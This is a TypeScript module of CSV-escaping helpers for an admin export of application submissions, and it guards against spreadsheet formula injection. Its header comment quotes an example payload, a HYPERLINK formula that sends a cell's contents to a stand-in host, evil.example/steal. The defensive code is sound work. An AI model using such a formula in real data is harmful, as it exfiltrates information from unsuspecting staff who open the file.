/**
 * Minimal RFC-4180-style CSV helpers used by the admin applications export
 * (see app/lib/application-csv.ts). A field is wrapped in double quotes if
 * it contains a comma, a double quote, or a line break, and any double
 * quote inside it is doubled -- the same escaping every spreadsheet app
 * expects.
 *
 * Every value passed here can originate from a public, unauthenticated apply
 * form submission (app/api/apply/route.ts and app/api/apply/staff/route.ts
 * only check that required fields are non-empty, not their content). Excel
 * and Google Sheets treat a cell whose first character is `=`, `+`, `-`, or
 * `@` as a formula, so a value like `=HYPERLINK("https://evil.example/steal?
 * "&A1,"click")` submitted as, say, an applicant's name would execute when a
 * staff member opens the exported CSV -- the standard CSV/formula-injection
 * class (CWE-1236). Prefixing such values with a leading `'` is the standard
 * mitigation: spreadsheet apps treat it as a force-text marker, so the value
 * displays as plain text instead of evaluating.
 */
const FORMULA_TRIGGER = /^[=+\-@]/;

export function escapeCsvField(value: string): string {
  const safe = FORMULA_TRIGGER.test(value) ? `'${value}` : value;
  if (/[",\r\n]/.test(safe)) {
    return "\"" + safe.replace(/"/g, "\"\"") + "\"";
  }
  return safe;
}

export function toCsvRow(fields: string[]): string {
  return fields.map(escapeCsvField).join(",");
}

/** Joins a header row and data rows into a full CSV string (CRLF line endings, per RFC 4180). */
export function buildCsv(header: string[], rows: string[][]): string {
  return [header, ...rows].map(toCsvRow).join("\r\n");
}
